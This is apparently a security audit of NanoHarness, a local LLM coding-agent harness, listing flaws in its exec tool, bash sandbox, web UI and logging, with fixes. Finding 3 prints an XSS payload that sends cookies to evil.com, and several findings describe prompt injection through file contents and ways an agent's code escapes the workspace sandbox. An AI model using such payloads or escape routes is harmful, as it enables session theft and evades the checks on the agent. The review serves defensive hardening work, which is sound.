# Security Review — NanoHarness

## Context

NanoHarness is a local AI coding agent harness (~3,700 lines) that gives an LLM (via Ollama) shell access, file I/O, and Python `exec()` on the user's machine. It has three UI modes: TUI, Web, and REPL. The security review covers the full codebase.

---

## Findings

### CRITICAL

#### 1. Unrestricted `exec()` in `python_exec` — arbitrary code execution in-process
**File:** `nanoharness/tools.py:179-197`

`_python_exec()` calls `exec(code, env)` with attacker-controlled (LLM-generated) code **in the same Python process** as NanoHarness itself. This means:
- The executed code can `import os; os.system(...)` bypassing the bash timeout
- It can read/write **any** file on the system (ignoring `_safe_path` workspace containment)
- It can monkey-patch NanoHarness internals (`import nanoharness; ...`)
- It can access the network, environment variables, kill processes, etc.
- There is **no timeout** on `exec()` — an infinite loop hangs the entire agent
- The `safety="workspace"` setting has **zero effect** on `python_exec`

**Recommendation:** At minimum, document this as a known risk. Ideally, run Python code via `subprocess` (like bash) with timeout, or sandbox it. Consider removing `python_exec` entirely since `bash` + `python -c` achieves the same with timeout protection.

#### 2. Web UI has no authentication — anyone on the network can execute commands
**File:** `nanoharness/web.py:23-117`

The FastAPI server binds to `127.0.0.1:8321` by default (good), but:
- The `host` is configurable via `NANO_WEB_HOST` env var or config — setting it to `0.0.0.0` exposes the agent to the entire network with **no authentication**
- Even on localhost, any browser tab or local process can send WebSocket/HTTP requests and execute arbitrary shell commands via the agent
- **No CORS headers** are set, meaning any website the user visits could make `fetch('/api/chat', ...)` requests to the local server (CSRF via same-site requests to `localhost:8321`)
- No rate limiting on the API endpoints
- No WebSocket origin validation

**Recommendation:**
- Add a random session token required for WebSocket/API access (generated at server start, embedded in the HTML)
- Validate WebSocket `Origin` header
- Add `Access-Control-Allow-Origin` headers to reject cross-origin requests
- Warn loudly when host is set to anything other than `127.0.0.1`

#### 3. XSS via LLM-generated content rendered as HTML
**File:** `nanoharness/web.py:357` (inline JS)

`currentContentEl.innerHTML = renderMd(contentBuf)` renders LLM output as HTML via `marked.parse()`. The `marked` library does **not** sanitize HTML by default — it passes through raw HTML tags. An LLM (or a prompt injection via file contents) could generate:
```html
<img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)">
```
This executes in the browser context, which has full access to the WebSocket connection and can issue commands.

Other `innerHTML` assignments in `richToHtml()` (`web.py:693-727`) also construct HTML from server data without sanitization.

**Recommendation:**
- Configure `marked` with `{sanitize: true}` or use DOMPurify to sanitize HTML output
- Use `textContent` instead of `innerHTML` where possible
- Sanitize the output of `richToHtml()`

### HIGH

#### 4. `_safe_path` bypass via symlinks
**File:** `nanoharness/tools.py:78-87`

`_safe_path()` calls `.resolve()` which follows symlinks, but the check only runs once at path resolution time. A symlink **inside** the workspace that points outside it would pass the check:
```
workspace/link -> /etc/passwd
```
`_safe_path("link")` resolves to `/etc/passwd`, which is outside workspace, and **would** be caught. However, `_safe_path(".")` returns the workspace itself, and `list_dir` uses `iterdir()` which **lists** symlink targets. More importantly, the LLM can use `bash` to create symlinks and then use `read_file`/`write_file` to access them — but since bash itself is unrestricted within the workspace (see next finding), this is moot.

**Assessment:** The path check is correct for direct traversal (`../../etc/passwd`), but the bash tool makes it largely irrelevant.

#### 5. `bash` tool has weak sandboxing
**File:** `nanoharness/tools.py:120-148`

In `safety="workspace"` mode, the bash sandbox only:
- Sets `cwd` to workspace
- Overrides `HOME` to workspace

This does **not** prevent:
- `cd /` and accessing any file on the system
- Network access (`curl`, `wget`, `ssh`, etc.)
- Process management (`kill`, `pkill`)
- Installing software (`pip install`, `brew install`)
- Modifying system files (`sudo` if the user has passwordless sudo)
- Creating symlinks to escape workspace for subsequent file operations

The `env` override only changes `HOME`; all other env vars (including `PATH`, AWS credentials, SSH keys, etc.) are inherited.

**Recommendation:** Document that `safety="workspace"` is a soft hint, not a security boundary. For real sandboxing, consider using `bwrap`, `nsjail`, or container-based isolation. At minimum, filter dangerous env vars.

#### 6. Shell escape (`!command`) bypasses safety entirely
**File:** `nanoharness/commands.py:72-76`

The `!command` shell escape runs **user-typed** commands through the same `bash` tool — this is intentional for user convenience. However, it means any user of the web UI (which has no auth — see finding #2) can directly execute shell commands.

### MEDIUM

#### 7. Sensitive data exposure in debug logs
**File:** `nanoharness/logging.py`

When `--debug` is enabled, **full conversation history** including user input, LLM responses, tool arguments (file contents, shell commands), and API payloads are written to `~/.nanoharness/debug/*.log` in plaintext. If a user works with secrets (env vars, API keys in files), they end up in the log.

**Recommendation:** Add a warning when debug mode is enabled. Consider redacting known secret patterns (API keys, tokens).

#### 8. No HTTPS/WSS for WebSocket transport
**File:** `nanoharness/web.py:297`

The WebSocket connects via `ws://` (unencrypted). While localhost traffic is generally safe, if the user configures a non-localhost host, all traffic (including shell commands and their output) is sent in cleartext.

**Recommendation:** Warn if host is not localhost. Document that HTTPS requires a reverse proxy.

#### 9. Ollama base_url is user-configurable — potential SSRF
**File:** `nanoharness/config.py:108`, `nanoharness/ollama.py:42-44`

The `ollama.base_url` can be set via env var (`NANO_OLLAMA_URL`) or config to point to any HTTP endpoint. While this is by design (remote Ollama), it means the agent will send conversation history (potentially containing sensitive file contents) to whatever URL is configured.

**Recommendation:** Low risk since user controls config, but worth documenting.

#### 10. CDN dependency for `marked.js`
**File:** `nanoharness/web.py:146`

```html
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
```

This loads JavaScript from a CDN without a Subresource Integrity (SRI) hash. A CDN compromise or MITM could inject malicious JavaScript.

**Recommendation:** Add an SRI `integrity` attribute, or bundle `marked.js` inline.

#### 11. `write_file` can overwrite critical files within workspace
**File:** `nanoharness/tools.py:158-162`

`write_file` will happily overwrite `.git/config`, `.env`, `Makefile`, or any file in the workspace. The LLM could be manipulated via prompt injection (e.g., a malicious README file) to overwrite critical project files.

**Recommendation:** Consider a blocklist for sensitive files (`.git/*`, `.env`, etc.) or require confirmation for overwrites.

### LOW

#### 12. No input validation on WebSocket JSON
**File:** `nanoharness/web.py:62-66`

`receive_json()` is called without schema validation. Malformed or excessively large JSON payloads could cause issues. FastAPI/Starlette handles this reasonably, but there's no explicit size limit.

#### 13. Todo file is world-readable
**File:** `nanoharness/tools.py:208-209`

The todo JSON file in the workspace has default permissions (typically 0644). Not a significant risk for a local tool.

#### 14. `model.name` injected into HTML template without escaping
**File:** `nanoharness/web.py:41-49`

Config values like `model.name` are string-replaced into the HTML template. A model name containing `</script>` or similar HTML could break the page. The risk is low since the user controls the config, but it's sloppy.

**Recommendation:** JSON-encode or HTML-escape config values before template injection.

---

## Summary by Severity

| Severity | Count | Key Issues |
|----------|-------|------------|
| CRITICAL | 3 | `exec()` without sandbox, no web auth, XSS via LLM output |
| HIGH     | 3 | Weak bash sandbox, symlink concerns, shell escape + no auth |
| MEDIUM   | 5 | Debug log exposure, no HTTPS, SSRF potential, CDN without SRI, file overwrite |
| LOW      | 3 | No WS input validation, todo perms, template injection |

## Recommended Priority Fixes

1. **XSS protection** — Add DOMPurify or configure marked sanitization (low effort, high impact)
2. **Web auth token** — Generate random token at startup, require it for WS/API (medium effort, critical for web mode)
3. **WebSocket origin check** — Reject connections from non-localhost origins (low effort)
4. **`python_exec` sandboxing** — Run via subprocess with timeout like bash, or remove entirely (medium effort)
5. **SRI hash on CDN script** — One-line fix
6. **HTML-escape template values** — Prevent config values from breaking the page
7. **Document security model** — Make clear that `safety=workspace` is advisory, not a security boundary

## Verification

After fixes:
- Run existing test suite: `uv run --extra test --extra playwright --extra web pytest tests/ -v`
- Manual test: open web UI, try `<script>alert(1)</script>` in LLM response
- Manual test: try cross-origin fetch from a different localhost port
- Manual test: verify auth token is required for WebSocket connection
